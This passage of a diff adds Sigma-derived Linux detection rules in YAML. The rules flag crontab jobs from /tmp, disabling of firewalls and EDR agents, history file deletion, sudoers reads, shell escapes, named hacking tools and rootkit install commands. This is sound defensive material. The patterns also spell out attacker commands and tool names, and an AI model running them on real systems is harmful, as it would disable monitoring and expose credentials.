+    or recurring execution of malicious code. Detection will focus on crontab jobs
+    uploaded from the tmp folder.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: crontab
+    - field: extra.CommandLine
+      op: contains
+      value: /tmp/
+    condition_logic: and
+  mitre_technique_id: T1053.003
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-0bc7a061
+  title: Security Software Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of system utilities (only grep and egrep for now) to
+    discover security software discovery
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /grep
+      - /egrep
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - nessusd
+      - td-agent
+      - packetbeat
+      - filebeat
+      - auditbeat
+      - osqueryd
+      - cbagentd
+      - falcond
+    condition_logic: and
+  mitre_technique_id: T1518.001
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-304f20c4
+  title: Disabling Security Tools
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects disabling security tools
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /service
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - iptables
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /service
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ip6tables
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /chkconfig
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - iptables
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /chkconfig
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ip6tables
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - firewalld
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - firewalld
+      - disable
+    - field: extra.NewProcessName
+      op: endswith
+      value: /service
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - cbdaemon
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /chkconfig
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - cbdaemon
+      - 'off'
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - cbdaemon
+      - stop
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - cbdaemon
+      - disable
+    - field: extra.NewProcessName
+      op: endswith
+      value: /setenforce
+    - field: extra.CommandLine
+      op: contains
+      value: '0'
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - stop
+      - falcon-sensor
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - disable
+      - falcon-sensor
+    condition_logic: or
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-7dea6c05
+  title: Disable Or Stop Services
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the usage of utilities such as 'systemctl', 'service'...etc
+    to stop or disable tools and services
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /service
+      - /systemctl
+      - /chkconfig
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - stop
+      - disable
+    condition_logic: and
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-86a59e0e
+  title: Setuid and Setgid
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects suspicious change of file privileges with chown and chmod commands
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains
+      value: chown root
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' chmod u+s'
+      - ' chmod g+s'
+    condition_logic: and
+  mitre_technique_id: T1548.001
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-bdb6832b
+  title: Shell Invocation Via Ssh - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of the "ssh" utility to execute a shell. Such behavior
+    may be associated with privilege escalation, unauthorized command execution, or
+    to break out from restricted environments.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /ssh
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ProxyCommand=;
+      - permitlocalcommand=yes
+      - localhost
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+      - sh 0<&2 1>&2
+      - sh 1>&2 0<&2
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-90ff97b4
+  title: Potential Linux Amazon SSM Agent Hijacking
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects potential Amazon SSM agent hijack attempts as outlined in the
+    Mitiga research report.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /amazon-ssm-agent
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - '-register '
+      - '-code '
+      - '-id '
+      - '-region '
+    condition_logic: and
+  mitre_technique_id: T1219.002
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-deac471d
+  title: Chmod Suspicious Directory
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects chmod targeting files in abnormal directory paths.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /chmod
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /tmp/
+      - /.Library/
+      - /etc/
+      - /opt/
+    condition_logic: and
+  mitre_technique_id: T1222.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-c1f0adeb
+  title: Container Residence Discovery Via Proc Virtual FS
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects potential container discovery via listing of certain kernel
+    features in the "/proc" virtual filesystem
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - awk
+      - /cat
+      - grep
+      - /head
+      - /less
+      - /more
+      - /nl
+      - /tail
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-28f2c34c
+  title: Suspicious Curl Change User Agents - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects a suspicious curl process start on linux with set useragent
+    options
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /curl
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' -A '
+      - ' --user-agent '
+    condition_logic: and
+  mitre_technique_id: T1071.001
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-c4282ee4
+  title: Docker Container Discovery Via Dockerenv Listing
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects listing or file reading of ".dockerenv" which can be a sing
+    of potential container discovery
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cat
+      - /dir
+      - /find
+      - /ls
+      - /stat
+      - /test
+      - grep
+    - field: extra.CommandLine
+      op: endswith
+      value: .dockerenv
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-f5b76560
+  title: Potentially Suspicious Execution From Tmp Folder
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects a potentially suspicious execution of a process located in
+    the '/tmp/' folder
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: startswith
+      value: /tmp/
+    condition_logic: and
+  mitre_technique_id: T1036
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-79bd6561
+  title: Potential Discovery Activity Using Find - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of "find" binary in a suspicious manner to perform discovery
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /find
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - -perm -4000
+      - -perm -2000
+      - -perm 0777
+      - -perm -222
+      - -perm -o w
+      - -perm -o x
+      - -perm -u=s
+      - -perm -g=s
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-3bbc835b
+  title: Suspicious Git Clone - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of "git" in order to clone a remote repository that
+    contain suspicious keywords which might be suspicious
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /git
+    - field: extra.CommandLine
+      op: contains
+      value: ' clone '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - exploit
+      - Vulns
+      - vulnerability
+      - RCE
+      - RemoteCodeExecution
+      - Invoke-
+      - CVE-
+      - poc-
+      - ProofOfConcept
+      - proxyshell
+      - log4shell
+      - eternalblue
+      - eternal-blue
+      - MS17-
+    condition_logic: and
+  mitre_technique_id: T1593.003
+  mitre_tactic: reconnaissance
+  flag: recon_candidate
+- id: lr-sigma-imported-a78e1883
+  title: History File Deletion
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects events in which a history file gets deleted, e.g. the ~/bash_history
+    to remove traces of malicious activity
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /rm
+      - /unlink
+      - /shred
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /.bash_history
+      - /.zsh_history
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - _history
+      - .history
+      - zhistory
+    condition_logic: and
+  mitre_technique_id: T1565.001
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-4c4ff812
+  title: Print History File Contents
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects events in which someone prints the contents of history files
+    to the commandline or redirects it to a file for reconnaissance
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cat
+      - /head
+      - /tail
+      - /more
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /.bash_history
+      - /.zsh_history
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - _history
+      - .history
+      - zhistory
+    condition_logic: and
+  mitre_technique_id: T1592.004
+  mitre_tactic: reconnaissance
+  flag: recon_candidate
+- id: lr-sigma-imported-4574fa62
+  title: Linux HackTool Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects known hacktool execution based on image name.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /crackmapexec
+      - /havoc
+      - /merlin-agent
+      - /merlinServer-Linux-x64
+      - /msfconsole
+      - /msfvenom
+      - /ps-empire server
+      - /ps-empire
+      - /sliver-client
+      - /sliver-server
+      - /Villain.py
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cobaltstrike
+      - /teamserver
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /autorecon
+      - /httpx
+      - /legion
+      - /naabu
+      - /netdiscover
+      - /nuclei
+      - /recon-ng
+    - field: extra.NewProcessName
+      op: contains
+      value: /sniper
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /dirb
+      - /dirbuster
+      - /eyewitness
+      - /feroxbuster
+      - /ffuf
+      - /gobuster
+      - /wfuzz
+      - /whatweb
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /joomscan
+      - /nikto
+      - /wpscan
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /aircrack-ng
+      - /bloodhound-python
+      - /bpfdos
+      - /ebpfki
+      - /evil-winrm
+      - /hashcat
+      - /hoaxshell.py
+      - /hydra
+      - /john
+      - /ncrack
+      - /nxc-ubuntu-latest
+      - /pidhide
+      - /pspy32
+      - /pspy32s
+      - /pspy64
+      - /pspy64s
+      - /setoolkit
+      - /sqlmap
+      - /writeblocker
+    - field: extra.NewProcessName
+      op: contains
+      value: /linpeas
+    condition_logic: or
+  mitre_technique_id: T1587
+  mitre_tactic: resource-development
+- id: lr-sigma-imported-afa34f6b
+  title: Potential Container Discovery Via Inodes Listing
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects listing of the inodes of the "/" directory to determine if
+    the we are running inside of a container.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /ls
+    - field: extra.CommandLine
+      op: endswith
+      value: ' /'
+    - field: extra.CommandLine
+      op: contains
+      value: ' / '
+    - field: extra.CommandLine
+      op: re
+      value: (?:\s-[^-\s]{0,20}i|\s--inode\s)
+    - field: extra.CommandLine
+      op: re
+      value: (?:\s-[^-\s]{0,20}d|\s--directory\s)
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-99d7dd0b
+  title: Interactive Bash Suspicious Children
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious interactive bash as a parent to rather uncommon
+    child processes
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentCommandLine
+      op: contains
+      value: bash -i
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-5c870759
+  title: Suspicious Java Children Processes
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects java process spawning suspicious children
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentProcessName
+      op: endswith
+      value: /java
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/sh
+      - bash
+      - dash
+      - ksh
+      - zsh
+      - csh
+      - fish
+      - curl
+      - wget
+      - python
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-796af927
+  title: Linux Network Service Scanning Tools Execution
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects execution of network scanning and reconnaisance tools. These
+    tools can be used for the enumeration of local or remote network services for
+    example.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /autorecon
+      - /hping
+      - /hping2
+      - /hping3
+      - /naabu
+      - /nmap
+      - /nping
+      - /telnet
+      - /zenmap
+    condition_logic: or
+  mitre_technique_id: T1046
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-4a0c1a50
+  title: Linux Shell Pipe to Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious process command line that starts with a shell that
+    executes something and finally gets piped into another shell
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - 'sh -c '
+      - 'bash -c '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - '| bash '
+      - '| sh '
+      - '|bash '
+      - '|sh '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - '| bash'
+      - '| sh'
+      - '|bash'
+      - ' |sh'
+    condition_logic: and
+  mitre_technique_id: T1140
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-4262a21a
+  title: Access of Sudoers File Content
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the execution of a text-based file access or inspection utilities
+    to read the content of /etc/sudoers in order to potentially list all users that
+    have sudo rights.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /cat
+      - /ed
+      - /egrep
+      - /emacs
+      - /fgrep
+      - /grep
+      - /head
+      - /less
+      - /more
+      - /nano
+      - /tail
+    - field: extra.CommandLine
+      op: contains
+      value: ' /etc/sudoers'
+    condition_logic: and
+  mitre_technique_id: T1592.004
+  mitre_tactic: reconnaissance
+  flag: recon_candidate
+- id: lr-sigma-imported-6471f94a
+  title: Linux Recon Indicators
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects events with patterns found in commands used for reconnaissance
+    on linux systems
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' -name .htpasswd'
+      - ' -perm -4000 '
+    condition_logic: and
+  mitre_technique_id: T1592.004
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-dc7b0e82
+  title: Potential Suspicious Change To Sensitive/Critical Files
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects changes of sensitive and critical files. Monitors files that
+    you don't expect to change without planning on Linux system.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - /bin/login
+      - /bin/passwd
+      - /boot/
+      - /etc/*.conf
+      - /etc/cron.
+      - /etc/crontab
+      - /etc/hosts
+      - /etc/init.d
+      - /etc/sudoers
+      - /opt/bin/
+      - /sbin
+      - /usr/bin/
+      - /usr/local/bin/
+    condition_logic: and
+  mitre_technique_id: T1565.001
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-9c9c572a
+  title: Shell Execution Of Process Located In Tmp Directory
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of shells from a parent process located in a temporary
+    (/tmp) directory
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.ParentProcessName
+      op: startswith
+      value: /tmp/
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /bash
+      - /csh
+      - /dash
+      - /fish
+      - /ksh
+      - /sh
+      - /zsh
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-eba32af8
+  title: Execution Of Script Located In Potentially Suspicious Directory
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects executions of scripts located in potentially suspicious locations
+    such as "/tmp" via a shell such as "bash", "sh", etc.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /bash
+      - /csh
+      - /dash
+      - /fish
+      - /ksh
+      - /sh
+      - /zsh
+    - field: extra.CommandLine
+      op: contains
+      value: ' -c '
+    - field: extra.CommandLine
+      op: contains
+      value: /tmp/
+    condition_logic: and
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-cca08acb
+  title: System Information Discovery
+  source: sigma
+  log_type: linux_endpoint
+  severity: informational
+  description: Detects system information discovery commands
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /uname
+      - /hostname
+      - /uptime
+      - /lspci
+      - /dmidecode
+      - /lscpu
+      - /lsmod
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-71a419a0
+  title: System Network Connections Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects usage of system utilities to discover system network connections
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /who
+      - /w
+      - /last
+      - /lsof
+      - /netstat
+    condition_logic: and
+  mitre_technique_id: T1049
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-03e0838c
+  title: System Network Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: informational
+  description: Detects enumeration of local network configuration
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /firewall-cmd
+      - /ufw
+      - /iptables
+      - /netstat
+      - /ss
+      - /ip
+      - /ifconfig
+      - /systemd-resolve
+      - /route
+    - field: extra.CommandLine
+      op: contains
+      value: /etc/resolv.conf
+    condition_logic: or
+  mitre_technique_id: T1016
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-8bcd8280
+  title: Mask System Power Settings Via Systemctl
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of systemctl mask to disable system power management
+    targets such as suspend, hibernate, or hybrid sleep. Adversaries may mask these
+    targets to prevent a system from entering [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /systemctl
+    - field: extra.CommandLine
+      op: contains
+      value: ' mask'
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - suspend.target
+      - hibernate.target
+      - hybrid-sleep.target
+    condition_logic: and
+  mitre_technique_id: T1653
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-0f81d17e
+  title: Touch Suspicious Service File
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of the "touch" process in service file.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /touch
+    - field: extra.CommandLine
+      op: contains
+      value: ' -t '
+    - field: extra.CommandLine
+      op: endswith
+      value: .service
+    condition_logic: and
+  mitre_technique_id: T1070.006
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-256d4e5f
+  title: Triple Cross eBPF Rootkit Execve Hijack
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects execution of a the file "execve_hijack" which is used by the
+    Triple Cross rootkit as a way to elevate privileges
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /sudo
+    - field: extra.CommandLine
+      op: contains
+      value: execve_hijack
+    condition_logic: and
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-04f24f71
+  title: Triple Cross eBPF Rootkit Install Commands
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects default install commands of the Triple Cross eBPF rootkit based
+    on the "deployer.sh" script
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /sudo
+    - field: extra.CommandLine
+      op: contains_all
+      values:
+      - ' tc '
+      - ' enp0s3 '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' qdisc '
+      - ' filter '
+    condition_logic: and
+  mitre_technique_id: T1014
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-f0f00f28
+  title: User Has Been Deleted Via Userdel
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects execution of the "userdel" binary. Which is used to delete
+    a user account and related files. This is sometimes abused by threat actors in
+    order to cover their tracks
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /userdel
+    condition_logic: and
+  mitre_technique_id: T1531
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-1e15185e
+  title: User Added To Root/Sudoers Group Using Usermod
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of the "usermod" binary to add users add users to the
+    root or suoders groups
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /usermod
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - -aG root
+      - -aG sudoers
+    condition_logic: and
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-bdeca5e3
+  title: Vim GTFOBin Abuse - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects the use of "vim" and it's siblings commands to execute a shell
+    or proxy commands. Such behavior may be associated with privilege escalation,
+    unauthorized command execution, or to break [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /rvim
+      - /vim
+      - /vimdiff
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - ' --cmd'
+      - ' -c '
+    - field: extra.CommandLine
+      op: contains_any
+      values:
+      - :!/
+      - ':lua '
+      - ':py '
+      - /bin/bash
+      - /bin/dash
+      - /bin/fish
+      - /bin/sh
+      - /bin/zsh
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-973b740b
+  title: Linux Webshell Indicators
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects suspicious sub processes of web server processes
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains_any
+      values:
+      - /whoami
+      - /ifconfig
+      - /ip
+      - /bin/uname
+      - /bin/cat
+      - /bin/crontab
+      - /hostname
+      - /iptables
+      - /netstat
+      - /pwd
+      - /route
+    condition_logic: and
+  mitre_technique_id: T1505.003
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-d1fa9638
+  title: Download File To Potentially Suspicious Directory Via Wget
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the use of wget to download content to a suspicious directory
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: endswith
+      value: /wget
+    - field: extra.CommandLine
+      op: re
+      value: \s-O\s
+    - field: extra.CommandLine
+      op: contains
+      value: --output-document
+    - field: extra.CommandLine
+      op: contains
+      value: /tmp/
+    condition_logic: and
+  mitre_technique_id: T1105
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-6ffc26b5
+  title: Potential Xterm Reverse Shell
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects usage of "xterm" as a potential reverse shell tunnel
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.NewProcessName
+      op: contains
+      value: xterm
+    - field: extra.CommandLine
+      op: contains
+      value: -display
+    - field: extra.CommandLine
+      op: endswith
+      value: :1
+    condition_logic: and
+  mitre_technique_id: T1059
+  mitre_tactic: execution
+  flag: suspicious_process
